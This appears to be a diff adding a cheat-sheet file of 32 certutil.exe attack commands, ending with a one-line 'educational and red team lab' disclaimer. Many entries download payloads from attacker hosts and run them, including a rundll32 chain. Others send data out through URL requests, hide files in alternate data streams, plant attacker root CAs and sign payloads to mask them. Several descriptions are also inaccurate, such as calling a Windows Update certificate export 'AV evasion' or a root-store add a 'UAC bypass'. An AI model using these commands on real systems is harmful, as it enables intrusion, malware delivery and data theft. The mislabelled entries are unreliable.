@@ -1,0 +1,99 @@
+CERTUTIL.EXE Payloads & Variations (32 Examples)
+
+1. Download file via HTTP:
+   certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
+
+2. Encode file to base64:
+   certutil -encode payload.exe payload.txt
+
+3. Decode base64 to binary:
+   certutil -decode payload.txt payload.exe
+
+4. View certificate store:
+   certutil -store My
+
+5. Extract public key from cert:
+   certutil -store -user My > pubkey.pem
+
+6. Create a dummy cert:
+   certutil -user -addstore Root dummycert.cer
+
+7. Dump certificate revocation list:
+   certutil -url dummycert.cer
+
+8. Encode script to base64 for PowerShell:
+   certutil -encode script.ps1 encoded.txt
+
+9. Create malicious INF file and sign:
+   certutil -addstore TrustedPublisher malicious.cer
+
+10. Verify signature on payload:
+    certutil -verify payload.exe
+
+11. Abuse for living-off-the-land download (LOLBAS):
+    certutil -urlcache -split -f http://attacker.com/evil.ps1 evil.ps1
+
+12. Convert cert to Base64 DER format:
+    certutil -encode cert.cer cert_base64.txt
+
+13. Convert Base64 cert back to binary:
+    certutil -decode cert_base64.txt cert_decoded.cer
+
+14. Generate random file (for AV evasion):
+    certutil -generateSSTFromWU legitfile.sst
+
+15. Download via UNC path (trigger auth):
+    certutil -urlcache -split -f \\attacker\share\payload.exe payload.exe
+
+16. Validate cert chain (OSINT evasion):
+    certutil -urlfetch -verify malicious.exe
+
+17. Dump system store:
+    certutil -user -store -enterprise
+
+18. Harvest certs from other users (if elevated):
+    certutil -user -store -pfx
+
+19. Use certutil to ping (time-based exfil):
+    certutil -urlcache -f http://attacker.com/`date /t`
+
+20. Sign payload (masquerade legitimacy):
+    certutil -sign payload.exe signer.cer signed_payload.exe
+
+21. Overwrite trusted store with custom CA:
+    certutil -addstore -enterprise -f Root attackerCA.cer
+
+22. Harvest CA trust list:
+    certutil -viewstore -enterprise CA
+
+23. Enumerate smart card certs:
+    certutil -scinfo
+
+24. Force revocation check (side-channel leak):
+    certutil -verify -urlfetch malicious.cer
+
+25. Check installed root CAs:
+    certutil -store root
+
+26. List templates (target cert abuse):
+    certutil -template
+
+27. Abuse certutil to rename files:
+    certutil -encode malware.exe newname.txt && ren newname.txt malware.exe
+
+28. Encode PowerShell dropper:
+    certutil -encode dropper.ps1 encoded.txt
+
+29. Decode obfuscated payload:
+    certutil -decode encoded_payload.txt stage2.exe
+
+30. Chain with rundll32 for delivery:
+    certutil -urlcache -split -f http://evil/payload.dll && rundll32 payload.dll,Entry
+
+31. Auto-persist a dropped cert for UAC bypass:
+    certutil -addstore Root persist.cer
+
+32. Bypass detection with alternate data stream:
+    certutil -urlcache -split -f http://attacker.com/evil.exe C:\temp\legit.exe:evil
+
+DISCLAIMER: This is for **educational and red team lab simulation** purposes only.
